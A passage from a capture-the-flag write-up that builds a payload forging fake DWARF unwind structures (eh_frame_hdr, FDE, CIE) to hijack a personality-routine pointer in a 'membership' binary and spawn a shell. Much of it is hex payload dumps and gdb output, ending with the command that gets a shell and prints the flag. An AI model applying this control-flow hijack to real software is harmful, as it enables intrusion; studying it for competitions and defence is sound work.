00000010  02 40 41 41 41 41 41 42  41 42 42 42 00 00 00 00  |.@AAAAABABBB....|
00000020  ff ff ff ff 00 00 00 00  34 50 02 40 43 43 43 43  |........4P.@CCCC|
00000030  00 00 00 00 50 e5 74 64  44 44 44 44 54 50 02 40  |....P.tdDDDDTP.@|
00000040  45 45 45 45 46 46 46 46  47 47 47 47 48 48 48 48  |EEEEFFFFGGGGHHHH|
00000050  49 49 49 49                                       |IIII|
```

```
Breakpoint 1, 0x0804901a in ?? ()
(gdb) x/20wx 0x402eb118
0x402eb118:     0x4002501c      0x00000000      0x402cf000      0x402e9038
0x402eb128:     0x402cf000      0x402cf0b4      0x402cf074      0x402eb168
0x402eb138:     0x401e5000      0x402c1086      0x401e5000      0x401e50d4
0x402eb148:     0x401e5074      0x402eb120      0x08048000      0x08049840
0x402eb158:     0x00000000      0x080480f4      0x080480b4      0x402eb138
(gdb) x/20wx 0x4002501c
0x4002501c:     0x00000000      0xffffffff      0x00000000      0x40025034
0x4002502c:     0x43434343      0x00000000      0x6474e550      0x44444444
0x4002503c:     0x40025054      0x45454545      0x46464646      0x47474747
0x4002504c:     0x48484848      0x49494949      0x00000000      0x00000000
0x4002505c:     0x00000000      0x00000000      0x00000000      0x00000000
(gdb) x/20wx 0x40025034
0x40025034:     0x6474e550      0x44444444      0x40025054      0x45454545
0x40025044:     0x46464646      0x47474747      0x48484848      0x49494949
0x40025054:     0x00000000      0x00000000      0x00000000      0x00000000
0x40025064:     0x00000000      0x00000000      0x00000000      0x00000000
0x40025074:     0x00000000      0x00000000      0x00000000      0x00000000
```

So, this payload basically lets us to execute `goto found;`  code (*unwind-dw2-fde-dip.c:225*) since the `data->pc` will be in between **pc_low** and **pc_high**.

Then, on line 315, **hdr** is calculated by adding **p\_eh\_frame\_hdr->p\_vaddr** and **load_base**, thus pointing **0x40025054**.
Time to build a fake **hdr** struct!

### hdr & table construction

Starting at +0x54 from our buffer comes the **hdr** struct.
It's a 4 byte struct and we fill in reasonable values here, according to the encoding scheme mentioned above.

```
*hdr:
 | version = 0x01
 | eh_frame_ptr_enc = 0x1b (DW_EH_PE_pcrel | DW_EH_PE_sdata4)
 | fde_count_enc = 0x03 (DW_EH_PE_absptr | DW_EH_PE_udata4)
 | table_enc = 0x3b (DW_EH_PE_datarel | DW_EH_PE_sdata4)
 ```

Then, as we saw earlier, **eh_frame** is read. Since the value is supposedly encoded with `(DW_EH_PE_pcrel | DW_EH_PE_sdata4)`, this value in our data should be an offset from where the **hdr** is. However, the value of **eh_frame** isn't really related to what we do, so we can put any value (**read\_encoded\_value\_with\_base** actually does the calculation given the base to correctly compute eh_frame's value).

Ok, next check is the following:

```
if (hdr-&gt;fde_count_enc != DW_EH_PE_omit
    && hdr-&gt;table_enc == (DW_EH_PE_datarel | DW_EH_PE_sdata4))
```

We have picked the values for encoding schems such that we satisfy both conditions.
Then, **fde_count** is read.
Since we do not want to create more than one set of fake structs (to be searched with binary search later), we will force this to be 1.

So with this data appended, we so far have this as our payload:

```
00000000  73 74 64 63 68 70 69 65  0a 41 18 b1 2e 40 1c 50  |stdchpie.A...@.P|
00000010  02 40 41 41 41 41 41 42  41 42 42 42 00 00 00 00  |.@AAAAABABBB....|
00000020  ff ff ff ff 00 00 00 00  34 50 02 40 43 43 43 43  |........4P.@CCCC|
00000030  00 00 00 00 50 e5 74 64  44 44 44 44 54 50 02 40  |....P.tdDDDDTP.@|
00000040  45 45 45 45 46 46 46 46  47 47 47 47 48 48 48 48  |EEEEFFFFGGGGHHHH|
00000050  49 49 49 49 01 1b 03 3b  4a 4a 4a 4a 01 00 00 00  |IIII...;JJJJ....|
```

Then, the **table** comes next. *fde_table* struct has two fields: **initial_loc** and **fde**.

As mentioned earlier, in order for the search to succeed, we need to satisfy `table[mid].initial_loc + data_base <= data->pc < table[mid].initial_loc + data_base + range`.

Note that data_base is pointing at **hdr** (**0x40025054**). So we can set **initial_loc** to **0xBFFDAFAC** such that `initial_loc + data_base == 0x40025054 + 0xBFFDAFAC  == 0x0`.

Also, the **fde** field is actually an (signed) offset from **hdr** &#8212; due to (DW\_EH\_PE\_datarel | DW\_EH\_PE\_sdata4) encoding. So, we set it to **0x14** to indicate that our fake **dwarf_fde** struct will be located at **0x40025068**.

Fake **hdr** and **table** construction is done, and we now have this:

```
00000000  73 74 64 63 68 70 69 65  0a 41 18 b1 2e 40 1c 50  |stdchpie.A...@.P|
00000010  02 40 41 41 41 41 41 42  41 42 42 42 00 00 00 00  |.@AAAAABABBB....|
00000020  ff ff ff ff 00 00 00 00  34 50 02 40 43 43 43 43  |........4P.@CCCC|
00000030  00 00 00 00 50 e5 74 64  44 44 44 44 54 50 02 40  |....P.tdDDDDTP.@|
00000040  45 45 45 45 46 46 46 46  47 47 47 47 48 48 48 48  |EEEEFFFFGGGGHHHH|
00000050  49 49 49 49 01 1b 03 3b  4a 4a 4a 4a 01 00 00 00  |IIII...;JJJJ....|
00000060  ac af fd bf 14 00 00 00                           |........|
```

The current payload, when fed to the program, will result in a crash since it will read an invalid value for the range.
To make `data->pc < initial_loc + data_base + range`  true, we need to construct a fake **dwarf_fde** now.

### fde & cie construction

As a final step, we are going to construct **fde** and **cie** records in our payload.

**dwarf_fde** struct has **length**, **CIE_delta**, and **pc_begin** fields (followed by *fde_augmentation length*, which should be 0).

We are going to make the **length** **0x1C**, and **CIE_delta** to **0xFFFFFFE4** (such that `&CIE_delta &mdash; CIE_delta == 0x40025088` &mdash; this will be explained later). We will set **pc_begin** to 0x0 (doesn't really matter what we put here).

What comes after **pc_begin** is the **range**. To explain a little bit, on line 412 in *unwind-dw2-fde-dip.c*, **range** is read from** f->pc\_begin[f\_enc_size]** where **f\_enc\_size** is **4**, making the 4 byte right after **pc_begin** be the **range**. Since we made the **init_loc** to be **0x0**, we will make the **range** to be **0xFFFFFFFF**. Then, we pad the last few bytes (so, technically we can fix the length, but that's what we used during the competition).

This yields our payload to be:

```
00000000  73 74 64 63 68 70 69 65  0a 41 18 b1 2e 40 1c 50  |stdchpie.A...@.P|
00000010  02 40 41 41 41 41 41 42  41 42 42 42 00 00 00 00  |.@AAAAABABBB....|
00000020  ff ff ff ff 00 00 00 00  34 50 02 40 43 43 43 43  |........4P.@CCCC|
00000030  00 00 00 00 50 e5 74 64  44 44 44 44 54 50 02 40  |....P.tdDDDDTP.@|
00000040  45 45 45 45 46 46 46 46  47 47 47 47 48 48 48 48  |EEEEFFFFGGGGHHHH|
00000050  49 49 49 49 01 1b 03 3b  14 00 00 00 01 00 00 00  |IIII...;........|
00000060  ac af fd bf 14 00 00 00  1c 00 00 00 e4 ff ff ff  |................|
00000070  00 00 00 00 ff ff ff ff  00 00 00 00 00 00 00 00  |................|
00000080  00 00 00 00 00 00 00 00                           |........|
```

We are almost there!!!

Above payload will result in `data->ret` to contain a pointer to our FDE struct and return to **\_Unwind\_Find_FDE**.

In **\_Unwind\_Find_FDE**, nothing interesting happens, and the same (a pointer to our fake FDE struct) is returned.

We are now back to **uw\_frame\_state_for** function (line 1180 in *unwind-dw2.c*). Since **fde** is not null, **extract\_cie\_info** is called with the **cie** pointer that is based on our **fde**.

```
1195
1196   cie = get_cie (fde);
1197   insn = extract_cie_info (cie, context, fs);
1198   if (insn == NULL)
1199     /* CIE contained unknown augmentation.  */
1200     return _URC_FATAL_PHASE1_ERROR;
1201
```

```
/* Locate the CIE for a given FDE.  */

static inline const struct dwarf_cie *
get_cie (const struct dwarf_fde *f)
{
  return (const void *)&f-&gt;CIE_delta - f-&gt;CIE_delta;
}
```

Looking at the **get_cie** function, we can see why we put **0xFFFFFFE4** for **CIE_delta** value in our FDE struct. With our setup, **get_cie** will return the CIE struct's address, which will be right after our fake FDE struct (aka 0x40025088).

Now, we have 1 final function that we need to understand: **extract\_cie\_info**.

This function is mostly parsing stuff and filling in the *\_Unwind\_Frame_State* data based on the CIE record.

**dwarf_cie** struct has **length**, **CIE_id**, **version**, and **augmentation** &#8212; and depending on augmentation content, more data follows.

Here's the values we set for our fake CIE struct:

```
*cie:
 | length = 0x1c
 | CIE_id = 0x0
 | version = 0x1
 | augmentation = 0x7a(z) 0x50(P) 0x4c(L) 0x52(R) 0x00(\0)
 - code_alignment = 0x01 (byte)
 - data_alignment = 0x7c (byte)
 - return_addr_col = 0x08 (byte)
 - augmentation_len = 0x07 (byte)
 - personality_enc = 0x00 (byte)
 - personality_ptr = 0x41424344 (4 bytes)
 - LSDA encoding = 0x00 (byte)
 - FDE_encoding = 0x1b (DW_EH_PE_pcrel | DW_EH_PE_sdata4)
```

Data that follows after augmentation string (code\_alignment, data\_alignment, return\_addr\_col) are read in first.
We chose these values just because we saw these in normal CIE struct, but it shouldn't matter what the values are.

Then, the rest of the data is parsed as augmentation contents (aka &#8216;zPLR').

1. If the first byte is &#8216;z', it sets <span class="lang:default decode:true  crayon-inline ">fs->saw_z flag</span>  and note that the length of the extra augmentation data (which follows the length itself) is **0x07**.
2. &#8216;P' indicates a personality routine  is specified in CIE (extra) augmentation, and basically read the **personality_ptr** value (4-byte) based on the **personality_enc** encoding scheme &#8212; which we set as 0x0 to make it absptr type.
3. &#8216;L' indicates a byte showing how the LSDA pointer is encoded. No idea what that is, but it's not relevant &#8212; we put 0x0.
4. &#8216;R' indicates a byte indicating how FDE addresses are encoded. We put some sane value that we saw earlier, but shouldn't matter either.

Alright, now with some padding bytes to make the total length **0x1c**, we are set.

Thus far, we have built the following payload:

```
00000000  73 74 64 63 68 70 69 65  0a 41 18 b1 2e 40 1c 50  |stdchpie.A...@.P|
00000010  02 40 41 41 41 41 41 42  41 42 42 42 00 00 00 00  |.@AAAAABABBB....|
00000020  ff ff ff ff 00 00 00 00  34 50 02 40 43 43 43 43  |........4P.@CCCC|
00000030  00 00 00 00 50 e5 74 64  44 44 44 44 54 50 02 40  |....P.tdDDDDTP.@|
00000040  45 45 45 45 46 46 46 46  47 47 47 47 48 48 48 48  |EEEEFFFFGGGGHHHH|
00000050  49 49 49 49 01 1b 03 3b  14 00 00 00 01 00 00 00  |IIII...;........|
00000060  ac af fd bf 14 00 00 00  1c 00 00 00 e4 ff ff ff  |................|
00000070  00 00 00 00 ff ff ff ff  00 00 00 00 00 00 00 00  |................|
00000080  00 00 00 00 00 00 00 00  1c 00 00 00 00 00 00 00  |................|
00000090  01 7a 50 4c 52 00 01 7c  08 07 00 44 43 42 41 00  |.zPLR..|...DCBA.|
000000a0  1b 00 00 00                                       |....|
```

And corresponding output when we run this payload against the binary:

```
(gdb) r &lt; payload
Starting program: /tmp/.ppp/./membership &lt; payload
userid :: password ::
Program received signal SIGSEGV, Segmentation fault.
0x08048e01 in ?? ()
(gdb) c
Continuing.
nested

Program received signal SIGSEGV, Segmentation fault.
0x08048cc5 in ?? ()
(gdb)
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x41424344 in ?? ()
(gdb)
```

YAY!!! WE HAVE EIP CONTROL!!!!111!!11!

Ok, now on to the final and easiest step: getting a shell.

### Give me a shell

Remember (from a while ago) that there was code that does `execlp("/bin/sh", "/bin/sh", 0)`?
For those who don't remember, it's located at `0x8048E97`.

All we have to do at this point is to replace **0x41424344** (personality routine pointer) to **0x8048e97**.

AND

```
$ cat payload - | /home/membership/membership
userid :: password :: nested
whoami
membership
cat /home/membership/key
G4R4Ge_BaND_wANNAB3
```

Voila! We have our shell (and the flag, of course!)

## Closing

I hope you enjoyed reading this write-up. (Although I suspect not.. due to its obscene length)

I apologize that this ended up being a LOT longer than I anticipated when I started writing, but I think it contains quite a bit of details that people can follow and reproduce the result.

Try it while their server is up!! Otherwise you will have to patch the binary such that the addresses work out.

Thank you for reading, and feel free to leave comments if you have any questions or suggestions.

_Write-up by Cai (Brian Pak) [<a href="https://www.bpak.org" target="_blank">https://www.bpak.org</a>]_